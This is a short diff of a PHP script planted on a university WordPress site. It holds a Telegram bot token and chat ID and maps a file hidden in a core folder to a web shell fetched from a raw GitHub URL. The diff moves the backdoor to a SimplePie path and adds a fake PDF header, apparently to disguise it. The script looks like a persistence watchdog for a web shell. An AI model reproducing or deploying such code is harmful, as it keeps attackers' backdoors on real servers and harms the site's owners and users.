@@ -1,10 +1,11 @@
+%PDF-1.3
 <?php
 $botToken   = "8219840842:AAGFPfxFZN-5P3066WbKRZ9X-bv5zWQDYRs";
 $chatId     = "-1002996607823";
 $siteLabel  = "https://plk.unair.ac.id/";
 
 $watchFiles = [
-    "/home/plkunair/public_html/wp-content/themes/kontol.php"
+    "/home/plkunair/public_html/wp-includes/SimplePie/src/Parse/apapun.php"
         => "https://raw.githubusercontent.com/guabantai/shell/refs/heads/main/re.php",
 
 ];
